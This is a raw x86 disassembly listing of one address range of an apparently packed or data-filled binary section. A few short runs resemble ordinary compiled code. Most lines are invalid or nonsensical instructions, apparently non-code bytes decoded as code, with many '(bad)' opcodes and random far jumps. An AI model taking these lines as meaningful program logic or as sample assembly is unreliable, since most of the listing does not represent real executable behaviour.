  403121:	(bad)  
  403122:	mov    bh,0xc1
  403124:	and    eax,DWORD PTR [ebx+0x3da7af7]
  40312a:	and    dl,BYTE PTR [edi-0x3]
  40312d:	rcr    DWORD PTR [ecx-0x73],cl
  403130:	hlt    
  403131:	or     ebx,eax
  403133:	mov    dh,0xbf
  403135:	call   0x8985:0xac6b4373
  40313c:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  403142:	clc    
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x75
  40316d:	push   edx
  40316e:	in     eax,dx
  40316f:	iret   
  403170:	mov    DWORD PTR ds:0x7d6f7e7e,edx
  403176:	jle    0x4031f6
  403178:	jg     0x4031b9
  40317a:	xlat   BYTE PTR ds:[ebx]
  40317b:	retf   0x839f
  40317e:	(bad)  
  40317f:	loopne 0x40318a
  403181:	mov    esp,0x65162b2a
  403186:	adc    eax,0x385dc850
  40318b:	enter  0x437,0xa7
  40318f:	je     0x403208
  403191:	sub    al,0xaf
  403193:	push   0xd890d165
  403198:	and    eax,0x91c4aabc
  40319d:	(bad)  
  40319e:	xor    al,0x59
  4031a0:	shl    DWORD PTR [ecx-0x78f84585],0x2a
  4031a7:	ins    DWORD PTR es:[edi],dx
  4031a8:	inc    ebx
  4031a9:	sbb    al,0x4e
  4031ab:	ret    
  4031ac:	int    0x9f
  4031ae:	cmp    BYTE PTR [ebx+0x308fa15c],al
  4031b4:	pusha  
  4031b5:	popa   
  4031b6:	push   esp
  4031b7:	pop    eax
  4031b9:	popf   
  4031ba:	loope  0x403141
  4031bc:	cmp    BYTE PTR [ebx-0x6712bf],ch
  4031c2:	jl     0x403239
  4031c4:	sti    
  4031c5:	imul   ecx,DWORD PTR [esi],0x14
  4031c8:	xchg   BYTE PTR [esi-0x13e4072c],ah
  4031ce:	and    eax,0xd18b47ac
  4031d3:	push   ebp
  4031d4:	xlat   BYTE PTR ds:[ebx]
  4031d5:	mov    WORD PTR [esi+0x2e],fs
  4031d8:	and    al,0x3d
  4031da:	test   al,0xed
  4031dc:	ins    BYTE PTR es:[edi],dx
  4031dd:	inc    eax
  4031de:	out    dx,eax
  4031df:	sub    eax,0x839c258b
  4031e4:	addr16 push 0x374e0f9e
  4031ea:	pushf  
  4031eb:	inc    eax
  4031ec:	fstp   st(2)
  4031ee:	adc    DWORD PTR [eax+0x57],esp
  4031f1:	push   ds
  4031f2:	lahf   
  4031f3:	inc    ebp
  4031f4:	js     0x403231
  4031f6:	add    eax,ecx
  4031f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031f9:	and    esp,ebx
  4031fb:	pop    ebp
  4031fc:	iret   
  4031fd:	mov    al,0x56
  4031ff:	(bad)  
  403200:	lods   eax,DWORD PTR ds:[esi]
  403201:	jnp    0x403221
  403203:	cwde   
  403204:	push   edx
  403205:	adc    DWORD PTR [edx+edx*4+0x55],ebx
  403209:	pop    ebp
  40320a:	add    ebp,DWORD PTR [ebx-0xd01280a]
  403210:	adc    al,0x4f
  403212:	les    esp,FWORD PTR [edi-0x7f772b12]
  403218:	aad    0x2f
  40321a:	fldcw  WORD PTR [esi]
  40321c:	test   al,0x52
  40321e:	cld    
  40321f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403221:	stc    
  403222:	fstp   DWORD PTR [edx+0x4b]
  403225:	sti    
  403226:	xor    al,0xe0
  403228:	fiadd  WORD PTR [ecx+0x4913a2e9]
  40322e:	lahf   
  40322f:	lahf   
  403230:	pop    ebx
  403231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403232:	or     DWORD PTR [edi-0x77],ebp
  403235:	gs adc eax,edi
  403238:	or     esi,0x30d7fb7f
  40323e:	out    dx,al
  40323f:	(bad)  
  403241:	sbb    DWORD PTR [esp+ebx*8],ebx
  403244:	out    dx,al
  403245:	cmp    ch,BYTE PTR [edi-0x4f]
  403248:	pusha  
  403249:	sti    
  40324a:	cmc    
  40324b:	shl    BYTE PTR [edi-0x26],cl
  40324e:	cdq    
  40324f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403250:	aaa    
  403251:	test   al,0xae
  403253:	test   DWORD PTR [ebx+esi*1],edx
  403256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403257:	fsub   QWORD PTR ds:0xefd3eddd
  40325d:	stos   DWORD PTR es:[edi],eax
  40325e:	(bad)  
  40325f:	fild   QWORD PTR [esi+0x7c545fec]
  403265:	rcr    BYTE PTR [edi],0xc
  403268:	add    bl,bh
  40326a:	pop    edx
  40326b:	(bad)  
  40326c:	out    dx,al
  40326d:	xor    DWORD PTR fs:[edx+0x1a],eax
  403271:	nop
  403272:	retf   
  403273:	sbb    eax,DWORD PTR [ecx]
  403275:	cmp    bl,BYTE PTR [ebp+ecx*1-0x2c2f699e]
  40327c:	loop   0x4032ce
  40327e:	mov    ecx,0xc8ac5cf9
  403283:	sbb    DWORD PTR [edx+0x256f5c9b],esi
  403289:	xchg   ebx,eax
  40328a:	ins    DWORD PTR es:[edi],dx
  40328b:	loop   0x4032e3
  40328d:	das    
  40328e:	leave  
  40328f:	cwde   
  403290:	sbb    al,0xbb
  403292:	(bad)  
  403293:	mov    cl,0x84
  403295:	dec    edx
  403296:	xor    al,0xc3
  403298:	cwde   
  403299:	aam    0x3c
  40329b:	ror    BYTE PTR [ecx+0x6ed691e0],1
  4032a1:	or     edx,esi
  4032a3:	mov    WORD PTR ds:0x8731443,ds
  4032a9:	pop    ss
  4032aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ab:	pop    ecx
  4032ac:	loop   0x403234
  4032ae:	lods   eax,DWORD PTR ds:[esi]
  4032af:	sub    al,0x36
  4032b1:	and    DWORD PTR [ebx-0x71fde94c],edx
  4032b7:	(bad)  
  4032b8:	repnz fstp DWORD PTR [ecx-0x71fdc864]
  4032bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c0:	test   BYTE PTR [edx-0x2f350fb7],ah
  4032c6:	jnp    0x403336
  4032c8:	pop    ebp
  4032c9:	bound  edi,QWORD PTR [edx+0x684702f9]
  4032cf:	mov    ebp,0x8fa68741
  4032d4:	scas   al,BYTE PTR es:[edi]
  4032d5:	and    bl,BYTE PTR [edi+0x7be18516]
  4032db:	repz pop edi
  4032dd:	mov    ecx,0xf4d86f30
  4032e2:	popf   
  4032e3:	sahf   
  4032e4:	pop    ds
  4032e5:	sbb    BYTE PTR [ebp+0x78],0xac
  4032e9:	ins    DWORD PTR es:[edi],dx
  4032ea:	sti    
  4032eb:	sub    esp,DWORD PTR [esi+0x7e147647]
  4032f1:	pop    edi
  4032f2:	xchg   ebp,eax
  4032f3:	pop    edx
  4032f4:	inc    edi
  4032f5:	call   0x7cd3:0xa4246534
  4032fc:	push   0x25
  4032fe:	mov    ds:0xe88490dc,eax
  403303:	or     BYTE PTR [ebp-0x4515ffdd],cl
  403309:	shl    DWORD PTR [esi],0x39
  40330c:	mov    ecx,0xac08a00f
  403311:	push   ds
  403312:	jge    0x4032fd
  403314:	into   
  403315:	inc    ecx
  403316:	cmp    DWORD PTR [esi-0x44490782],esp
  40331c:	sub    DWORD PTR [ebx-0x799878e9],ebp
  403322:	adc    eax,0xf66fdd38
  403327:	aad    0x47
  403329:	js     0x403387
  40332b:	pop    ecx
  40332c:	jbe    0x4032d6
  40332e:	(bad)  
  40332f:	inc    DWORD PTR [edi+edx*8+0x29]
  403333:	inc    DWORD PTR [edx-0x1a25e379]
  403339:	pop    ds
  40333a:	mov    ebp,0x34f1140f
  40333f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403340:	push   esi
  403341:	pop    ecx
  403342:	mov    esp,0x13b08480
  403347:	mov    cl,0x3a
  403349:	or     ebx,DWORD PTR [ebx+0x4f]
  40334c:	sub    ch,bl
  40334e:	and    al,0x3a
  403350:	mul    BYTE PTR ds:0xfc14832e
  403356:	jnp    0x403331
  403358:	out    0x1,al
  40335a:	xchg   BYTE PTR [ebx+eiz*4-0x7d],bh
  40335e:	jg     0x40333b
  403360:	push   ds
  403361:	sbb    edx,ecx
  403363:	sar    BYTE PTR ds:0xcae19552,cl
  403369:	xor    DWORD PTR [edi+0x45],ecx
  40336c:	mov    bl,BYTE PTR [esi]
  40336e:	jg     0x4033b5
  403370:	adc    DWORD PTR [edx+0x2b],eax
  403373:	rol    BYTE PTR [ebx+ebp*4],1
  403376:	lds    ebx,FWORD PTR [edi-0x43ef04a6]
  40337c:	mov    bl,0x3e
  40337e:	imul   ecx,DWORD PTR [esi],0x2e5cc869
  403384:	push   edi
  403385:	sbb    BYTE PTR [eax-0x3bd0e082],bh
  40338b:	inc    ebp
  40338c:	rol    bh,0xa2
  40338f:	lahf   
  403390:	cmp    DWORD PTR ds:0xf95e89a6,ecx
  403396:	fist   DWORD PTR [edx-0x1c]
  403399:	ret    0x30f3
  40339c:	popf   
  40339d:	or     BYTE PTR [ebx-0x68e298b],al
  4033a3:	inc    edx
  4033a4:	pop    eax
  4033a5:	jmp    0x1f554d74
  4033aa:	jl     0x4033d4
  4033ac:	(bad)  
  4033ae:	lods   eax,DWORD PTR ds:[esi]
  4033af:	jae    0x4033a3
  4033b1:	ret    0x1799
  4033b4:	out    0x79,al
  4033b6:	daa    
  4033b7:	push   es
  4033b8:	xchg   ebx,eax
  4033b9:	fsubr  DWORD PTR [edi]
  4033bb:	mov    eax,ebx
  4033bd:	ins    DWORD PTR es:[edi],dx
  4033be:	pop    DWORD PTR [ebx]
  4033c0:	mov    edi,0x9ae34cf6
  4033c5:	jmp    0x40337b
  4033c7:	xchg   BYTE PTR [ebx],bh
  4033c9:	mov    ?,WORD PTR [ecx]
  4033cb:	pop    es
  4033cc:	test   bl,bh
  4033ce:	mov    ah,0x99
  4033d0:	aam    0xbd
  4033d2:	pop    ebx
  4033d3:	stos   DWORD PTR es:[edi],eax
  4033d4:	(bad)
  4033d8:	mov    edx,DWORD PTR ds:0x2ef5d06
  4033de:	mov    eax,0xb46edccd
  4033e3:	jo     0x403428
  4033e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033e6:	repz jl 0x403369
  4033e9:	js     0x403438
  4033eb:	dec    eax
  4033ec:	cld    
  4033ed:	in     eax,dx
  4033ee:	inc    edi
  4033ef:	dec    edi
  4033f0:	inc    ebp
  4033f1:	inc    edi
  4033f2:	aaa    
  4033f3:	in     al,0xc3
  4033f5:	sahf   
  4033f6:	call   0x885e:0xa355bd7b
  4033fd:	pop    edx
  4033fe:	daa    
  4033ff:	xchg   ebp,esp
  403401:	popf   
  403402:	shr    dh,0x29
  403405:	imul   DWORD PTR [edi]
  403407:	push   ss
  403408:	xlat   BYTE PTR ds:[ebx]
  403409:	jno    0x4033b0
  40340b:	mov    bh,0x80
  40340d:	lods   eax,DWORD PTR ds:[esi]
  40340e:	sbb    eax,0xd4874233
  403413:	xlat   BYTE PTR ds:[ebx]
  403414:	sub    al,0xec
  403416:	retf   0xfccb
  403419:	pop    esi
  40341a:	mov    cl,BYTE PTR ds:0x8a42a47d
  403420:	lock mov edx,0xc04626fb
  403426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403427:	mov    ds:0xfcf2e9db,al
  40342c:	and    bh,BYTE PTR [eax+ebx*2]
  40342f:	cmp    BYTE PTR [ebx+0x49],dh
  403432:	frstor [edx+0x49d3a40b]
  403438:	enter  0x43f8,0xe0
  40343c:	clc    
  40343d:	or     cl,BYTE PTR [ebx+0x76]
  403440:	clc    
  403441:	inc    eax
  403442:	mov    ebx,0xb76f4245
  403447:	fstp   DWORD PTR [edx+ecx*8+0x56]
  40344b:	retf   0xc7c
  40344e:	sbb    edi,ebp
  403450:	jo     0x403427
  403452:	daa    
  403453:	lahf   
  403454:	mov    eax,esp
  403456:	stc    
  403457:	push   ss
  403458:	dec    BYTE PTR [esi]
  40345a:	inc    edx
  40345b:	xchg   eax,ebx
  40345d:	jmp    0x9ed2591e
  403462:	push   ebp
  403463:	or     al,0xc2
  403465:	mov    eax,ds:0x68abcf28
  40346a:	push   esi
  40346b:	mov    eax,ds:0xd0ce07da
  403470:	cdq    
  403471:	lahf   
  403472:	cli    
  403473:	pop    ds
  403474:	fdivr  DWORD PTR [ebx]
  403476:	das    
  403477:	or     BYTE PTR [ecx],al
  403479:	lods   al,BYTE PTR ds:[esi]
  40347a:	imul   eax,esp,0x5d
  40347d:	shl    BYTE PTR [edi],cl
  40347f:	dec    ecx
  403480:	push   cs
  403481:	dec    edx
  403482:	imul   eax,DWORD PTR [esp+ebp*8],0xf
  403486:	inc    BYTE PTR [eax+0x2f9922ef]
  40348c:	jo     0x403478
  40348e:	mov    ah,0xdc
  403490:	mov    dh,0xad
  403492:	jge    0x403449
  403494:	mov    ds:0x3566740,eax
  403499:	mov    ds:0xfd36c3d1,eax
  40349e:	mov    eax,DWORD PTR [ebx+ebx*2+0x3a]
  4034a2:	and    ah,bh
  4034a4:	lock sahf 
  4034a6:	jecxz  0x4034d9
  4034a8:	out    0x52,eax
  4034aa:	or     eax,0x70fc951
  4034af:	mov    edi,es
  4034b1:	and    al,0x5c
  4034b3:	cmp    dh,dl
  4034b5:	add    DWORD PTR [eax-0x18],edx
  4034b8:	scas   eax,DWORD PTR es:[edi]
  4034b9:	(bad)  
  4034bc:	outs   dx,BYTE PTR ds:[esi]
  4034bd:	cs mov esi,0xe65e8128
  4034c3:	pop    esi
  4034c4:	push   esi
  4034c5:	and    BYTE PTR [esi+0x42],dh
  4034c8:	out    dx,eax
  4034c9:	add    al,0x4f
  4034cb:	cdq    
  4034cc:	jle    0x403535
  4034ce:	inc    eax
  4034cf:	pop    edi
  4034d0:	mov    al,ds:0xeeee1a92
  4034d5:	mov    al,0x4f
  4034d7:	dec    esp
  4034d8:	mov    WORD PTR [ebx-0x34],fs
  4034db:	mov    WORD PTR ds:0xd64b93c7,?
  4034e1:	mov    BYTE PTR [eax],al
  4034e3:	or     eax,0xee535666
  4034e8:	push   esi
  4034e9:	icebp  
  4034ea:	out    dx,al
  4034eb:	lock pop eax
  4034ed:	or     bh,BYTE PTR cs:[edx]
  4034f0:	sbb    BYTE PTR [eax+0x5d154b60],bh
  4034f6:	lock dec ecx
  4034f8:	cmp    BYTE PTR [eax],bh
  4034fa:	out    dx,eax
  4034fb:	lods   eax,DWORD PTR ds:[esi]
  4034fc:	jno    0x40356a
  4034fe:	das    
  4034ff:	cld    
  403500:	test   al,0x77
  403502:	in     eax,dx
  403503:	pop    esp
  403504:	add    BYTE PTR [ebx],0xe6
  403507:	leave  
  403508:	and    edx,ecx
  40350a:	jbe    0x403504
  40350c:	fcom   QWORD PTR [edi-0x2f4e2c0c]
  403512:	jnp    0x403553
  403514:	aam    0x2e
  403516:	inc    ecx
  403517:	out    dx,al
  403518:	les    edi,FWORD PTR [eax-0x1b]
  40351b:	(bad)  
  40351c:	or     BYTE PTR [ecx-0x9e41032],dl
  403522:	sub    BYTE PTR [ebx+0x43329ebf],cl
  403528:	sub    BYTE PTR ds:0x2dc175c0,dh
  40352e:	push   ds
  40352f:	inc    esp
  403530:	inc    edx
  403531:	fisttp QWORD PTR [ecx+edx*8+0x30631878]
  403538:	lods   eax,DWORD PTR ds:[esi]
  403539:	push   ss
  40353a:	fs sbb eax,0x27a7d77f
  403540:	fwait
  403541:	mov    ebp,DWORD PTR [ebx+0x8]
  403544:	or     al,0x0
  403546:	jnp    0x40352b
  403548:	sbb    DWORD PTR [eax+ebx*2-0x17398d34],esi
  40354f:	add    dh,BYTE PTR [ebx+0x3e]
  403552:	sbb    ch,dh
  403554:	test   DWORD PTR [edx],edx
  403556:	xchg   ecx,eax
  403557:	mov    ecx,0xf77c0671
  40355c:	ffreep st(6)
  40355e:	xchg   ebp,eax
  40355f:	imul   eax,DWORD PTR [esi+edx*2],0xffffffb7
  403563:	(bad)  
  403565:	push   esp
  403566:	outs   dx,BYTE PTR ds:[esi]
  403567:	cs jp  0x4034f5
  40356a:	dec    ebp
  40356b:	clc    
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	mov    bh,0x65
  403599:	imul   ecx,DWORD PTR [esi+eax*4+0x6f7e7e11],0x237e7e7d
  4035a4:	lods   eax,DWORD PTR ds:[esi]
  4035a5:	ret    0x5ede
  4035a8:	dec    eax
  4035a9:	inc    esp
  4035aa:	adc    al,0x9
  4035ac:	les    ebx,FWORD PTR fs:[ebx-0x1ca95896]
  4035b3:	cmp    al,0xf3
  4035b5:	aam    0xbf
  4035b7:	jp     0x4035bd
  4035b9:	loopne 0x403587
  4035bb:	cli    
  4035bc:	inc    ebp
  4035bd:	retf   0xc01
  4035c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035c1:	push   cs
  4035c2:	ins    DWORD PTR es:[edi],dx
  4035c3:	xchg   ecx,eax
  4035c4:	xchg   DWORD PTR [esi+0x7e43a361],edx
  4035ca:	frstor [edi]
  4035cc:	push   ebp
  4035cd:	ins    DWORD PTR es:[edi],dx
  4035ce:	xchg   ebp,eax
  4035cf:	and    eax,0xa7cece38
  4035d4:	ret    0xad88
  4035d7:	mov    edx,es
  4035d9:	add    bh,dh
  4035db:	push   cs
  4035dc:	push   esi
  4035dd:	pop    ds
  4035de:	(bad)  
  4035df:	cmc    
  4035e0:	test   BYTE PTR [edi],ch
  4035e2:	int3   
  4035e3:	add    al,0xe9
  4035e5:	xchg   edi,eax
  4035e6:	jno    0x4035b0
  4035e8:	stos   BYTE PTR es:[edi],al
  4035e9:	je     0x403583
  4035eb:	mov    dh,0x17
  4035ed:	lds    edx,FWORD PTR [edx+0x4764d0eb]
  4035f3:	xor    eax,0xcb4e06fc
  4035f8:	fisttp QWORD PTR [ebp+0x6147c68d]
  4035fe:	mov    DWORD PTR [eax+0x21c2da9e],edi
  403604:	mov    eax,ds:0x8e40e92d
  403609:	mov    DWORD PTR [esi+0x70],eax
  40360c:	fs mov esp,0x630abff1
  403612:	je     0x403678
  403614:	adc    eax,0x9598f930
  403619:	and    esi,DWORD PTR [edi]
  40361b:	cmp    DWORD PTR ds:0xc09a340,edi
  403621:	gs cdq 
  403623:	push   ecx
  403624:	cmp    eax,0xf268d667
  403629:	(bad)  
  40362a:	mov    cl,0x6e
  40362c:	jge    0x403653
  40362e:	lods   al,BYTE PTR ds:[esi]
  40362f:	xchg   esp,eax
  403630:	add    esi,DWORD PTR [eax]
  403632:	xchg   edi,eax
  403633:	fistp  DWORD PTR [eax]
  403635:	ret    0x7ac8
  403638:	lock mov al,ds:0xb618e39c
  40363e:	sbb    ah,BYTE PTR [ebx+eiz*2]
  403641:	dec    edi
  403642:	cli    
  403643:	es push 0xd
  403646:	mov    cl,0x6a
  403648:	pop    es
  403649:	int    0xf5
  40364b:	rep outs dx,BYTE PTR ds:[esi]
  40364d:	aaa    
  40364e:	adc    dl,cl
  403650:	clc    
  403651:	shl    DWORD PTR [ebp+0x6],0xb9
  403655:	inc    eax
  403656:	xchg   esp,eax
  403657:	hlt    
  403658:	inc    ebp
  403659:	in     al,dx
  40365a:	xchg   BYTE PTR [eax+0x4ce0cc1c],ah
  403660:	pop    esi
  403661:	iret   
  403662:	sub    DWORD PTR [ebx+0xa60a9e5],ebx
  403668:	inc    edi
  403669:	jmp    0x403633
  40366b:	sbb    edi,ebx
  40366d:	add    eax,DWORD PTR [edx+0x5]
  403670:	inc    ebp
  403671:	dec    ebp
  403672:	outs   dx,BYTE PTR ds:[esi]
  403673:	push   edi
  403674:	fwait
  403675:	lods   al,BYTE PTR ds:[esi]
  403676:	push   eax
  403677:	fstp   TBYTE PTR [edx+0x53]
  40367a:	jg     0x4036d7
  40367c:	push   ebx
  40367d:	mov    ah,0x59
  40367f:	or     ecx,DWORD PTR [edx+0x49]
  403682:	cmp    esp,esi
  403684:	sbb    ch,BYTE PTR [ecx]
  403686:	sub    BYTE PTR [edx+0x3577004b],ah
  40368c:	lods   al,BYTE PTR ds:[esi]
  40368d:	inc    ebx
  40368e:	mov    esi,0x15cce7bc
  403693:	sti    
  403694:	sar    dl,0x33
  403697:	outs   dx,BYTE PTR ds:[esi]
  403698:	mov    ah,0x63
  40369a:	popf   
  40369b:	ret    0x15ce
  40369e:	and    BYTE PTR [esp+esi*8],ch
  4036a1:	jmp    0xb136:0x784b3fa2
  4036a8:	push   esi
  4036a9:	push   es
  4036aa:	into   
  4036ab:	push   ds
  4036ac:	xchg   BYTE PTR [edi+0x6d],al
  4036af:	in     al,dx
  4036b0:	lods   eax,DWORD PTR ds:[esi]
  4036b1:	xor    DWORD PTR [edx],ebp
  4036b3:	pop    es
  4036b4:	push   ebx
  4036b5:	(bad)  
  4036b6:	and    eax,0xd2524ade
  4036bb:	xchg   esp,eax
  4036bc:	and    cl,BYTE PTR [eax]
  4036be:	imul   edx,DWORD PTR [esi],0x6d5ede8d
  4036c4:	xor    ebx,esp
  4036c6:	aad    0x20
  4036c8:	into   
  4036c9:	popa   
  4036ca:	das    
  4036cb:	jno    0x403712
  4036cd:	mov    edi,edi
  4036cf:	and    DWORD PTR [esi+0x516ce99a],0xffffff8e
  4036d6:	dec    eax
  4036d7:	push   0xe5d8725
  4036dc:	push   ss
  4036dd:	inc    ebx
  4036de:	ss pop ss
  4036e0:	jno    0x4036fe
  4036e2:	cwde   
  4036e3:	sbb    eax,DWORD PTR [esi-0x64]
  4036e6:	cmp    bl,al
  4036e8:	lds    ecx,FWORD PTR [esi-0x26]
  4036eb:	bound  ebx,QWORD PTR [ecx-0x77e059e6]
  4036f1:	and    al,0xb0
  4036f3:	sti    
  4036f4:	or     bh,BYTE PTR [edi]
  4036f6:	dec    ebx
  4036f7:	or     cl,bh
  4036f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036fa:	fistp  QWORD PTR [ecx+0x512f9091]
  403700:	sbb    ebp,ebp
  403702:	dec    esi
  403703:	icebp  
  403704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403705:	or     edi,edx
  403707:	mov    ds:0xb55875b2,al
  40370c:	cmp    al,0x65
  40370e:	mov    bh,0xc2
  403710:	mov    dl,0xfc
  403712:	pusha  
  403713:	test   BYTE PTR [edx],al
  403715:	aas    
  403716:	pop    edx
  403717:	daa    
  403718:	call   0xf8a:0x761bc73a
  40371f:	fstp   DWORD PTR [ebx+0x129cac0f]
  403725:	sub    dl,BYTE PTR [eax+eiz*1+0x3d]
  403729:	jecxz  0x40377f
  40372b:	lds    ebx,FWORD PTR [ecx]
  40372d:	push   cs
  40372e:	jle    0x4036e4
  403730:	(bad)  
  403731:	shl    cl,0xe4
  403734:	push   ds
  403735:	retf   0xaff4
  403738:	inc    ecx
  403739:	adc    edx,edx
  40373b:	popf   
  40373c:	mov    ch,0xac
  40373e:	in     al,0xec
  403740:	lea    esp,[edx+0x70]
  403743:	rcr    ebx,0x2c
  403746:	aam    0x6a
  403748:	dec    esp
  403749:	retf   0x4601
  40374c:	(bad)
  403750:	in     eax,dx
  403751:	pop    eax
  403752:	mov    edi,cs
  403754:	mov    eax,ds:0x5ce4b9fb
  403759:	jmp    0xf9a78e6c
  40375e:	pusha  
  40375f:	fimul  WORD PTR [esi]
  403761:	xchg   edx,eax
  403762:	jbe    0x403746
  403764:	fiadd  DWORD PTR [ecx+0x6f17d683]
  40376a:	xchg   esi,eax
  40376b:	scas   eax,DWORD PTR es:[edi]
  40376c:	push   0x37
  40376e:	adc    eax,0x6a5b8270
  403773:	pop    ebx
  403774:	cli    
  403775:	mov    edx,DWORD PTR ds:0xf010dd40
  40377b:	jmp    0xa9b6f4a0
  403780:	ss pop ecx
  403782:	arpl   WORD PTR [eax+0x4934aedf],dx
  403788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403789:	pop    edx
  40378a:	sbb    dh,BYTE PTR [eax]
  40378c:	repz ja 0x403714
  40378f:	or     al,0x73
  403791:	adc    esp,edx
  403793:	add    ebx,DWORD PTR ds:0xc7f1e569
  403799:	mov    esi,0x1a810aa4
  40379e:	div    DWORD PTR [ebx+0x1c]
  4037a1:	sub    DWORD PTR [eax+ebp*1+0x47],esp
  4037a5:	ret    
  4037a6:	xchg   ecx,eax
  4037a7:	jmp    0x6a79:0x9db8638
  4037ae:	ror    BYTE PTR [esi-0x5a],cl
  4037b1:	or     eax,0x22e36a75
  4037b6:	repz in al,dx
  4037b8:	or     dl,BYTE PTR [edx-0x22aa0722]
  4037be:	pop    edx
  4037bf:	xor    al,0x5f
  4037c1:	push   ecx
  4037c2:	ds cmp al,0x32
  4037c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037c6:	ja     0x403824
  4037c8:	imul   DWORD PTR [esi-0x7b]
  4037cb:	add    al,0x8f
  4037cd:	mov    dh,0x60
  4037cf:	popa   
  4037d0:	xor    eax,0x9ee6d7bf
  4037d5:	lea    ebx,[edx+0x6d]
  4037d8:	dec    eax
  4037d9:	sub    BYTE PTR [ebx-0x501e6295],bl
  4037df:	sbb    cl,BYTE PTR [ebp-0x54]
  4037e2:	jmp    0xc1ff9424
  4037e7:	ds xchg edi,eax
  4037e9:	jnp    0x4037fa
  4037eb:	hlt    
  4037ec:	xchg   DWORD PTR [edi],edx
  4037ee:	inc    ebx
  4037ef:	loopne 0x4037a9
  4037f1:	stos   BYTE PTR es:[edi],al
  4037f2:	xchg   ebx,eax
  4037f3:	mov    cl,0x6c
  4037f5:	push   eax
  4037f6:	in     al,0x29
  4037f8:	daa    
  4037f9:	fistp  QWORD PTR [ecx+edi*4-0x62]
  4037fd:	or     DWORD PTR [edx+0x1b],esi
  403800:	mov    esi,fs
  403802:	xchg   esi,eax
  403803:	jge    0x4037ea
  403805:	in     al,0x60
  403807:	js     0x40379b
  403809:	sub    esp,esp
  40380b:	mov    ch,BYTE PTR [edx+0x813d76d]
  403811:	pop    esi
  403812:	adc    ebx,DWORD PTR [eax+0x23]
  403815:	xlat   BYTE PTR ds:[ebx]
  403816:	ins    DWORD PTR es:[edi],dx
  403817:	dec    esp
  403818:	and    ah,al
  40381a:	dec    ebp
  40381b:	gs mov ecx,0xedab6c7
  403821:	cld    
  403822:	push   es
  403823:	push   ss
  403824:	pop    cx
  403826:	icebp  
  403827:	dec    ebx
  403828:	sub    DWORD PTR [edx-0x4f109c64],edx
  40382e:	aam    0xd1
  403830:	sbb    eax,0x51222299
  403835:	into   
  403836:	push   esp
  403837:	sahf   
  403838:	xchg   esi,eax
  403839:	adc    edi,DWORD PTR [esi+0x63ad66ed]
  40383f:	pop    edx
  403840:	nop
  403841:	shr    edx,0x7a
  403844:	jne    0x4038b9
  403846:	loop   0x40384d
  403848:	inc    edi
  403849:	out    dx,al
  40384a:	and    DWORD PTR ds:0x526057d4,edi
  403850:	(bad)  
  403851:	push   esi
  403852:	test   DWORD PTR [ebp-0x9],edx
  403855:	pop    ss
  403856:	stos   BYTE PTR es:[edi],al
  403857:	aas    
  403858:	or     al,0xaf
  40385a:	adc    DWORD PTR [ebx],0x650d9560
  403860:	cmp    BYTE PTR [ebx-0x4d],bl
  403863:	sub    ah,BYTE PTR [edx-0x42]
  403866:	xchg   edi,eax
  403867:	jge    0x403817
  403869:	push   ebp
  40386a:	fsubr  st(3),st
  40386c:	push   0xffffffa4
  40386e:	jo     0x40385c
  403870:	xchg   ebx,eax
  403871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403872:	sbb    ecx,DWORD PTR [edx-0x56e03007]
  403878:	mov    ds:0xb707de0d,al
  40387d:	and    al,0x21
  40387f:	loopne 0x40380e
  403881:	cdq    
  403882:	xchg   edx,eax
  403883:	or     edi,DWORD PTR [edi]
  403885:	ret    0xcb31
  403888:	loop   0x403887
  40388a:	in     eax,0xba
  40388c:	sub    ebp,DWORD PTR [eax]
  40388e:	adc    bl,ah
  403890:	fmul   DWORD PTR [edi]
  403892:	ja     0x403836
  403894:	push   ebp
  403895:	mov    ss,esi
  403897:	pop    ebx
  403898:	inc    esp
  403899:	call   0x774e:0xad787dd8
  4038a0:	(bad)  
  4038a1:	dec    esp
  4038a2:	nop
  4038a3:	jbe    0x403911
  4038a5:	mov    eax,ds:0xa14746fd
  4038aa:	imul   ebx,DWORD PTR [edi+0x7d],0x2a
  4038ae:	fbld   TBYTE PTR [ecx-0x66d5101d]
  4038b4:	ror    DWORD PTR [ebx],0x9c
  4038b7:	es icebp 
  4038b9:	loop   0x403851
  4038bb:	or     esi,DWORD PTR [esp+eax*8]
  4038be:	push   ecx
  4038bf:	or     eax,0x28585765
